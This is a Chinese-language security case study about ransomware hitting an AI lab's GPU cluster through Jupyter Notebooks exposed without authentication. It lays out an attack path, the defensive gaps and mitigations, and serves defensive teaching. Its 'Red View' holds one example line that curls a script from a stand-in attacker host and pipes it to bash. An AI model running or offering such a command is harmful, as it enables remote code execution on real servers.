# 利用暴露的 Jupyter Notebook 远程代码执行控制 AI 训练节点
- **所属领域**: AI 安全
- **威胁类型**: 基础设施安全 / 远程代码执行 (RCE) / 未授权访问
- **事件回顾**: 某高校人工智能实验室的计算集群遭遇勒索软件攻击，大量科研数据和训练中的模型被加密。调查发现，多名研究人员为了方便在家中进行实验，将其运行在校园网服务器上的 Jupyter Notebook 服务直接暴露在了公网，且未设置任何身份验证密码或使用了默认的弱密码。攻击者通过 Shodan 等网络空间搜索引擎轻易扫描到了这些开放端口，并直接进入了 Notebook 界面，执行恶意 Python 代码控制了服务器。
- **Red View (利用路径)**: 攻击者利用网络扫描引擎搜索公网上暴露的特定端口（如默认的 8888 端口）并匹配 Jupyter Notebook 的 HTTP 响应指纹。一旦发现目标且无密码保护，攻击者即可在浏览器中打开 Web 终端或新建一个 Notebook 单元格，输入诸如 `import os; os.system('curl http://attacker.com/malware.sh | bash')` 的 Python 脚本，直接在宿主机层面实现远程代码执行。随后，攻击者通过反弹 Shell 建立持久化连接，并横向感染同一子网下的其他 GPU 节点。
- **Blue View (防御缺失)**: 研究人员安全意识薄弱，将核心的开发和训练工具直接暴露在不可信的互联网环境中。实验室网络缺乏纵深防御，未部署 VPN 或零信任网络访问 (ZTNA) 网关来保护内部服务。Jupyter 服务配置存在严重缺陷，禁用了默认的 Token 认证机制或使用了极弱的口令。同时，缺乏对公网暴露资产的持续监控和收敛机制。
- **策略借鉴**: 严禁将 Jupyter Notebook、TensorBoard 等 AI 开发/监控工具直接暴露在公网，必须通过 VPN、堡垒机或反向代理（并配置强身份认证与 MFA）进行访问；强制启用并加强 Jupyter 的 Token 或密码认证机制；在计算节点层面，以非 root 用户权限运行 Jupyter 服务，并限制其对关键系统目录的访问；定期进行资产暴露面测绘，及时关闭不必要的风险端口。
